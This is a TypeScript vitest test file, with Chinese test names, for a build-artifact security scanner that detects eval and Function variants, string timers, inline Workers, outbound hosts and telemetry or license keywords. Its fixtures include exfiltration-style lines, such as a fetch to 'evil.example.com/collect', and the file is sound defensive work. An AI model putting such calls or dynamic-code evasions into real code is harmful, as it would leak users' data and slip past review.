import type { ArtifactPolicy } from './artifacts.ts'
import { describe, expect, it } from 'vitest'
import { checkFileTypes, classifyArtifact, scanArtifacts } from './artifacts.ts'
import { ARTIFACT_POLICY } from './policy.ts'

const policy: ArtifactPolicy = { ...ARTIFACT_POLICY, allowedHosts: { 'www.w3.org': 'SVG 命名空间' }, globalThisProbeMax: 1 }

function rules(content: string, path = 'assets/index.js'): string[] {
  return scanArtifacts([{ path, content }], policy).violations.map(v => v.rule)
}

describe('US-M1-11 A01 产物扫描：动态代码', () => {
  it.each([
    ['eval(', 'eval("1+1")'],
    ['可选调用的 eval', 'eval?.(code)'],
    ['间接 eval', '(0, eval)("x")'],
    ['逗号表达式里的 eval', '(1,eval)(code)'],
    ['globalThis.eval', 'globalThis.eval(code)'],
    ['window.eval', 'window.eval(code)'],
    ['Worker 里的 self.eval', 'self.eval(code)'],
    ['用下标取 eval', 'window["eval"](code)'],
    ['new Function', 'new Function("return 1")'],
    ['new window.Function', 'new window.Function("x")'],
    ['不带 new 的 Function，参数是变量', 'var f=Function(code)();'],
    ['不带 new 的 Function，多个参数', 'Function(a,b)'],
    ['字符串 Function', 'Function("a","return a")'],
    ['经 constructor 取到 Function', '(function(){}).constructor("return 1")()'],
    ['字符串定时器', 'setTimeout("alert(1)", 10)'],
    ['字符串 setInterval', 'setInterval(\'tick()\', 10)'],
    ['window.setTimeout 的字符串参数', 'window.setTimeout("alert(1)",1)'],
    ['WebAssembly', 'WebAssembly.instantiate(bytes)'],
    ['用下标访问 WebAssembly', 'WebAssembly["instantiate"](b)'],
    ['内联 Worker（Blob）', 'new Worker(URL.createObjectURL(new Blob([atob(s)],{type:"text/javascript"})))'],
    ['内联 Worker（data URL）', 'new Worker("data:text/javascript;base64,AAAA")'],
  ])('违规：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/dynamic-code')
  })

  it('合规：常见的正常写法不误报', () => {
    const code = [
      'a.evaluate(x);b.myFunction("x");obj.eval2=1;isFunction("x");',
      'typeof f==="function";x instanceof Function;Function.prototype.call.bind(f);',
      'setTimeout(fn,0);self.setTimeout(()=>{},1);',
      'new Worker(new URL("./formula.worker-abc.js",import.meta.url),{type:"module"});',
      'var s="//";var t="a//b";',
    ].join('\n')
    expect(rules(code)).toEqual([])
  })

  it('合规：全局对象探测在允许的次数以内；超过即违规', () => {
    expect(rules('var g=Function("return this")();')).toEqual([])
    expect(rules('Function("return this")();Function(\'return this\')();')).toEqual(['artifacts/global-this-probe'])
  })
})

describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
  it.each([
    ['https', 'fetch("https://evil.example.com/collect?x=1")'],
    ['大写的协议', 'fetch("HTTPS://EVIL.EXAMPLE.COM/x")'],
    ['wss', 'new WebSocket("wss://t.example.com/s")'],
    ['协议相对地址', 'fetch("//evil.example.com/collect")'],
    ['JSON 转义的斜杠', 'JSON.parse("{\\"u\\":\\"https:\\\\/\\\\/evil.example.com\\"}")'],
    ['CSS 里的外部地址', 'body{background:url(https://cdn.example.net/bg.png)}'],
  ])('违规：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/host')
  })

  it('合规：允许清单里的主机（不区分大小写）', () => {
    expect(rules('const ns="http://www.w3.org/2000/svg";const x="HTTP://WWW.W3.ORG/1999/xhtml"')).toEqual([])
  })

  it.each(['Sentry.init({dsn:d})', 'new PostHog()', 'o.license_key="x"', 'o.licenseKey="x"', 'import("@univerjs-pro/license")', 'https://www.googletagmanager.com/gtag/js'])('违规：关键字（不区分大小写）%s', (code) => {
    expect(rules(code)).toContain('artifacts/keyword')
  })

  it('汇总出现过的主机，便于审查允许清单', () => {
    const { hosts } = scanArtifacts([{ path: 'a.js', content: '"http://www.w3.org/1999/xhtml" "http://www.w3.org/2000/svg"' }], policy)
    expect(hosts).toEqual(new Map([['www.w3.org', 2]]))
  })
})

describe('US-M1-11 A01 产物的文件类型', () => {
  it('合规：已登记的类型与三个清单文件', () => {
    expect(checkFileTypes(['index.html', 'assets/index-a.js', 'assets/x.css', 'assets/f.woff2', 'assets/logo.svg', 'config.json', 'THIRD-PARTY-LICENSES.md', '.vite/manifest.json', '.vite/third-party-packages.json'])).toEqual([])
  })

  it.each(['assets/x.wasm', 'assets/app.js.map', 'assets/data.bin', 'README', 'notes.md', 'docs/THIRD-PARTY-LICENSES.md'])('违规：未登记的类型或位置 %s', (path) => {
    expect(checkFileTypes([path]).map(v => v.rule)).toEqual(['artifacts/file-type'])
  })

  it('清单文件不扫描内容，其他 .json 按文本扫描', () => {
    expect(classifyArtifact('THIRD-PARTY-LICENSES.md')).toBe('metadata')
    expect(classifyArtifact('.vite/manifest.json')).toBe('metadata')
    expect(classifyArtifact('config.json')).toBe('text')
  })
})
